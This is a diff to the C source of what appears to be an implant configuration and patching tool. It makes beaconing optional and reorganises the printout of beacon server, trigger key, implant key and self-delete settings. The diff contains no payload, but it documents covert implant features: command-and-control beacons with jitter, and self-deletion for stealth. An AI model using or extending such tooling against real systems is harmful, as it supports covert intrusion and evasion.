@@ -425,18 +425,20 @@ int main(int argc, char **argv)
 	}
 
 	if (raw == 0) {
-		if ((args.beacon_port == 0) || (args.interval == 0) || (strlen(args.beacon_ip) == 0)) {
-			printf("\n");
-			printf("    %sERROR: Incomplete options%s\n", RED, RESET);
-			usage(argv);
-			return -1;
-		}
-		// Enforce 0 <= jitter <= 30 requirement.
-		if (((int) args.jitter < 0) || (args.jitter > 30)) {
-			printf("\n");
-			printf("    %sError: Incorrect options%s\n", RED, RESET);
-			usage(argv);
-			return -1;
+		if (args.init_delay > 0) {			// Beacons enabled
+			if ((args.beacon_port == 0) || (args.interval == 0) || (strlen(args.beacon_ip) == 0)) {
+				printf("\n");
+				printf("    %sERROR: Incomplete options%s\n", RED, RESET);
+				usage(argv);
+				return -1;
+			}
+			// Enforce 0 <= jitter <= 30 requirement.
+			if (((int) args.jitter < 0) || (args.jitter > 30)) {
+				printf("\n");
+				printf("    %sError: Incorrect options%s\n", RED, RESET);
+				usage(argv);
+				return -1;
+			}
 		}
 
 		if (	(linux_x86 == 0) &&
@@ -455,20 +457,24 @@ int main(int argc, char **argv)
 
 		printf("\n");
 		printf("  This application will generate PATCHED files with the following values:\n\n");
-		printf("\t%32s: %-s\n", "Beacon Server IP address", host);
-		printf("\t%32s: %-d\n", "Beacon Server Port number", args.beacon_port);
 		printf("\t%32s: %-s\n", "Primary DNS Server IP address", args.dns[0]);
 		printf("\t%32s: %-s\n", "Secondary DNS Server IP address", args.dns[1]);
 		printf("\t%32s: ", "Trigger Key"); printSha1Hash(stdout, "", triggerKey); printf("\n");
 		printf("\t%32s: ", "Implant Key"); printSha1Hash(stdout, "", implantKey); printf("\n");
-		printf("\t%32s: %-lu\n", "Beacon Initial Delay (sec)", args.init_delay / 1000);
-		printf("\t%32s: %-d\n", "Beacon Interval (sec)", args.interval / 1000);
-		printf("\t%32s: %-d\n", "Beacon Jitter (%)", args.jitter);
-		printf("\t%32s: %-lu\n", "Self Delete Delay (sec)", args.delete_delay);
+		if (args.init_delay > 0) {
+			printf("\n\t%32s: %-s\n", "Beacon Server IP address", host);
+			printf("\t%32s: %-d\n", "Beacon Server Port number", args.beacon_port);
+			printf("\t%32s: %-lu\n", "Beacon Initial Delay (sec)", args.init_delay / 1000);
+			printf("\t%32s: %-d\n", "Beacon Interval (sec)", args.interval / 1000);
+			printf("\t%32s: %-d\n", "Beacon Jitter (%)", args.jitter);
+		} else {
+			printf("\n\t%32s\n", "Beacons Disabled");
+		}
+		printf("\n\t%32s: %-lu\n", "Self Delete Delay (sec)", args.delete_delay);
 		printf("\t%32s: %-s\n", "Self Delete Control File Path", args.sdpath);
 		printf("\t%32s: %-d\n", "Trigger Delay (+/-30 sec)", args.trigger_delay / 1000);
 	}
-;
+
 	printf("\n  Target Operating Systems:\n");
 
 	// little endian systems targets
